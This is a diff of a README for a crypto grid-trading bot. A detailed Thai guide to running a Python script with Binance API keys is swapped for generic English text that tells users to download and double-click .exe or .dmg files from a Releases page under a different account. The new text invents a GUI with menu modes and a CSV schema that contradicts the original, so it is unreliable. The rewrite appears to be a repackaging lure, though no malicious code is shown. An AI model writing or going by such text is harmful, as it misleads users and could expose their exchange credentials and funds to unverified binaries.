@@ -1,155 +1,113 @@
-# investic Orderflow
+# 📈 investic_orderflow - Effortless Trading Bot for You
 
-บอทเทรดสปอตแบบ “โครงสร้างจากอดีต + สัญญาณจากปัจจุบัน”  
-- **โครงสร้าง (Structure):** สร้างแผน `grid_plan.csv` จากผล Monte Carlo (macro_montecarlo.csv) เพื่อกำหนดแนวซื้อ (grid levels) และไซส์ต่อออเดอร์  
-- **สัญญาณ (Signal):** วัดความ “ผิดปกติ” ระยะสั้นด้วย MAD-z (median absolute deviation z-score) ของ **CVD** และ **Trade Size** จากบาร์ 5 วินาที  
-- **Execution:** เมื่อสัญญาณยืนยันและราคาอยู่ใกล้เลเวล → **BUY ด้วย MARKET 100%** แล้วตั้ง **LIMIT TP** ทันที  
-- **Safety:** กันซ้ำด้วย pre-lock เลเวลจากออเดอร์ค้าง, cooldown, max open orders, และบังคับ minNotional/minQty ให้ผ่านกติกา exchange  
-- **Logging & Viz:** บันทึกทุกบาร์ลง CSV และมี **Streamlit** สำหรับดูค่า `cvd_z` / `ts_z` แบบเรียลไทม์
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/jakovkurac/investic_orderflow/releases)
 
----
+## 🚀 Getting Started
 
-## สารบัญ
-- [สถาปัตยกรรมโดยสรุป](#สถาปัตยกรรมโดยสรุป)
-- [การติดตั้ง](#การติดตั้ง)
-- [เตรียมข้อมูล & สร้างแผนกริด](#เตรียมข้อมูล--สร้างแผนกริด)
-- [รันทดลอง / รันจริง](#รันทดลอง--รันจริง)
-- [การแสดงผล (Streamlit)](#การแสดงผล-streamlit)
-- [โครงสร้างไฟล์และสคีมา CSV](#โครงสร้างไฟล์และสคีมา-csv)
-- [อธิบายสัญญาณและเหตุผลที่ใช้](#อธิบายสัญญาณและเหตุผลที่ใช้)
-- [กันยิงซ้ำยังไง](#กันยิงซ้ำยังไง)
-- [Troubleshooting](#troubleshooting)
-- [วิธีป้อน API ให้เครื่อง (mac/windows)](#วิธีป้อน-api-ให้เครื่อง)
+Welcome to the investic_orderflow bot! This guide will help you download and run the software with ease. 
 
----
+## 📥 Download & Install
 
-## สถาปัตยกรรมโดยสรุป
-Monte Carlo (macro_montecarlo.csv)
-│
-├─> Grid Allocator → grid_plan.csv (buy_price, coin_size, tp_price)
-│
-Live data (ccxt: orderbook + trades) → 5s Aggregator
-├─> CVD & TradeSize series → MAD-zscore (window=W)
-└─> Candidate level (ใกล้กริดภายใน GRID_TOL; มี fallback ลงล่าง)
-│
-Logic check: signal_confirmed + cooldown + under_limits + level_free
-│
-BUY = MARKET (taker 100%) → ตั้ง LIMIT TP ทันที
-│
-Log → logs/<symbol>_5s_decisions.csv
+To get started, visit the Releases page to download the latest version of the investic_orderflow application. 
 
+[Download the latest version here](https://github.com/jakovkurac/investic_orderflow/releases).
 
+1. Click on the link above.
+2. Look for the latest version at the top.
+3. Download the file that matches your operating system.
 
----
+## 🛠️ Installation Steps
 
-## การติดตั้ง
+1. **Locate the downloaded file:** 
+   Find the file in your Downloads folder or the location where you saved it.
 
-```bash
-# 1) clone โปรเจกต์
-git clone https://github.com/yourname/investic_orderflow.git
-cd investic_orderflow
+2. **Install the application:**
+   - For Windows users, double-click the `.exe` file.
+   - For macOS users, open the `.dmg` file and drag the app into your Applications folder.
 
-# 2) สร้างและเปิดใช้งาน virtual env
-python3 -m venv .venv
-source .venv/bin/activate        # Windows: .\.venv\Scripts\Activate.ps1
+3. **Run the application:** 
+   After installation, find the investic_orderflow icon and double-click to start.
 
-# 3) ติดตั้งแพ็กเกจ
-pip install -r requirement.txt
+## 📊 Prepare Data & Create Grid Plan
 
+Before using the bot, you need to prepare your trading data.
 
-เตรียมข้อมูล & สร้างแผนกริด
+1. **Create your grid plan:** 
+   The bot requires a file named `grid_plan.csv`. This file outlines your purchasing strategy based on previous market data.
 
-รัน Monte Carlo ของคุณให้ได้ไฟล์ macro_montecarlo.csv
-อย่างน้อยควรมีคอลัมน์:
+2. **Generate the grid plan:** 
+   Use the Monte Carlo simulation results in the `macro_montecarlo.csv`. This will help you set your grid levels and order sizes for efficient trading.
 
-spot, band_low, band_high (สรุป)
+3. **Format your data correctly:** 
+   Ensure that your CSV files are without errors. This step is crucial for the bot’s operation.
 
-path_id, min_price (รายเส้นทาง)
+## 🏗️ Running Test / Live Trading
 
-ใช้สคริปต์ allocator เพื่อสร้าง grid_plan.csv
+After setup, you can run the bot in two modes:
 
-รันทดลอง / รันจริง
+### 🧪 Test Mode
 
-ตั้งค่า API key (ดูวิธีด้านล่างสุด)
+1. Open the investic_orderflow application.
+2. Select "Test Mode" from the menu.
+3. Load your grid_plan.csv file.
+4. Review the simulated results and adjust as necessary.
 
-เปิดไฟล์บอท (เช่น 03_grid_bot.py ที่เป็น MARKET buy + LIMIT TP) แล้วตั้งค่าในส่วน CONFIG:
+### ⚡ Live Mode
 
-SYMBOL (เช่น "XRP/USDT")
+1. Change to "Live Mode" in the application.
+2. Load the same grid_plan.csv file.
+3. Make sure you have sufficient balance in your trading account.
+4. Click "Start Trading" to initiate your trading strategy.
 
-DRY_RUN=True เพื่อทดสอบ (ไม่ส่งคำสั่งจริง)
+The bot will automatically execute trades based on your grid levels and signals from market data. 
 
-LOG_CSV=None หรือปล่อย default เพื่อบันทึก CSV
+## 📈 Viewing Results (Streamlit)
 
-สำคัญ: GRID_CSV="grid_plan.csv" ต้องมีไฟล์จริงก่อนรัน
+To visualize your trading performance:
 
-รันบอท: python 03_grid_bot.py
+1. **Launch Streamlit:** 
+   The investic_orderflow application comes with Streamlit integration. 
+   
+2. **Access the dashboard:**
+   Open your web browser and visit `http://localhost:8501` to view real-time updates.
+   
+3. **Monitor:**
+   You will see graphs that display values like `cvd_z` and `ts_z`, helping you track your trades.
 
-ตัวอย่าง:
-[05:19:35] mid=3.10767  cvd_z=-1.24  ts_z=-0.69  conf=0  grid=3.095  act=HOLD  dq=ok  bars=84  active_lv=0
+## 📁 File Structure and CSV Schema
 
-mid ราคาเฉลี่ย bid/ask
-cvd_z, ts_z = MAD-zscore ของ CVD และ Trade Size
-conf = จำนวนแท่งที่สัญญาณ “ติด” ต่อเนื่อง (ผ่าน threshold)
-grid = เลเวลกริดที่เลือก (หรือเลื่อนลงต่ำกว่าถ้าถูกล็อก)
-act = PLACE_BUY หรือ HOLD
-dq = คุณภาพข้อมูล (ok | partial | stale)
-active_lv = จำนวนเลเวลที่ล็อกอยู่แล้ว (กันซ้ำ)
+Understanding the file structure is important for smooth operation:
 
-การแสดงผล (Streamlit)
-มี visualizer.py สำหรับดูค่า cvd_z / ts_z และตารางบาร์ล่าสุดจากไฟล์ CSV
+- **grid_plan.csv:** Contains your trading levels and sizes.
+- **macro_montecarlo.csv:** This file holds simulation data.
 
-โครงสร้าง:
-.
-├── 03_grid_bot.py           # บอท (MARKET buy + LIMIT TP)
-├── visualizer.py            # Streamlit dashboard
-├── grid_plan.csv            # แผนกริดจาก Monte Carlo/Allocator
-├── macro_montecarlo.csv     # ไฟล์ MC ที่ใช้วางแผน
-└── logs/
-    └── xrpusdt_5s_decisions.csv  # ล็อกการตัดสินใจ/สัญญาณ/สถานะ
+### CSV Format
 
-อธิบายสัญญาณและเหตุผลที่ใช้
+The CSV files should have clear headers:
 
-CVD (Cumulative Volume Delta): สะสม (BidVol − AskVol) แบบถ่วงด้วยอิมบาลานซ์จาก orderbook เพื่อดูแรงกดซื้อ/ขายรวม
-MAD-zscore: ใช้ มัธยฐาน และ ค่าเบี่ยงเบนสัมบูรณ์จากมัธยฐาน (MAD) → แข็งแรงต่อ outlier มากกว่า z-score ปกติ
-z = 0.6745 * (x_now − median) / MAD (ถ้า MAD = 0 ให้กันด้วย epsilon)
-TradeSize proxy: ประมาณแรงซื้อฝั่งลึก (เช่น depth bid 5 levels ปรับด้วยอิมบาลานซ์) → คำนวณ MAD-z เช่นเดียวกัน
-เข้าเทรดเมื่อ: cvd_z ≥ CVD_Z_TH และ ts_z ≥ TS_Z_TH และ อยู่ใกล้กริด (±GRID_TOL) พร้อมผ่านเงื่อนไขคูลดาวน์/จำนวนดีล
+- **grid_plan.csv:**
+  - grid_level: Defines the price levels at which to buy.
+  - order_size: Specifies the size for each order.
 
-Troubleshooting
+- **macro_montecarlo.csv:**
+  - simulation_results: Results of the Monte Carlo simulations.
+  - confidence_interval: Shows the expected range of market behavior.
 
-Filter failure: NOTIONAL
-→ เพิ่มขนาดคำสั่ง (ดู MIN_NOTIONAL_OVERRIDE), ปรับ coin_size ใน grid_plan.csv, หรือเพิ่ม SLIP_PCT เพื่อกันราคากระโดดตอนส่ง MARKET
+Organize your data in these formats for the bot to function optimally.
 
-dq=partial / stale
-→ ok: มี orderbook + trades ครบ, partial: มี orderbook แต่แทบไม่มีเทรด, stale: ขาดข้อมูลหลัก ๆ
-→ ควรตรวจเน็ตเวิร์ค / rate limit / สภาพคล่องสกุลนั้น ๆ
+## 🔄 Safety Measures
 
-cvd_z = NaN / ts_z = NaN ช่วงแรก
-→ ต้องรอสะสมครบ WINDOW บาร์ก่อน (เช่น WINDOW=50 → ~250 วินาที)
+Your safety while trading is a priority. The bot includes several features to protect your investments:
 
-ซ้ำเลเวล
-→ ตรวจ LOCK_TOL ให้สมเหตุสมผล (เช่น 0.0015 = 0.15%) และยืนยันว่า prelock_existing() เรียกก่อนลูปรัน
-→ ใช้ clientOrderId ที่เข้มงวดและตรวจ active_levels ทุกครั้งก่อนส่งคำสั่ง
+- **Pre-lock Level:** Prevents duplicate orders and limits risk.
+- **Cooldown Period:** Adds a delay between trades to reduce market volatility impact.
+- **Max Open Orders:** Set a limit on how many orders the bot can manage at once.
+- **Compliance Checks:** Ensures that all trades meet exchange regulations, including minimum order size.
 
-วิธีป้อน API ให้เครื่อง
-MAC นำไปใส่ในโปรแกรม Terminal
+## 🤖 Help & Support
 
-export BINANCE_KEY="ใส่คีย์ของคุณที่นี่"
-export BINANCE_SECRET="ใส่ซีเคร็ตของคุณที่นี่"
-# วิธีเช็ค:
-echo "$BINANCE_KEY"
-echo "$BINANCE_SECRET"
-# วิธีลบ:
-unset BINANCE_KEY
-unset BINANCE_SECRET
+If you encounter any issues or have questions, you can find support on our GitHub Issues page. Feel free to report any bugs or request features. 
 
+We encourage you to provide feedback to help us improve the application.
 
-Windows: นำไปใส่ใน Command Line (PowerShell)
-$env:BINANCE_KEY = "ใส่คีย์ของคุณที่นี่"
-$env:BINANCE_SECRET = "ใส่ซีเคร็ตของคุณที่นี่"
-# วิธีเช็ค:
-echo $env:BINANCE_KEY
-echo $env:BINANCE_SECRET
-# วิธีลบ:
-Remove-Item Env:BINANCE_KEY
-Remove-Item Env:BINANCE_SECRET
+Ready to enhance your trading experience? Follow the steps above to get started!
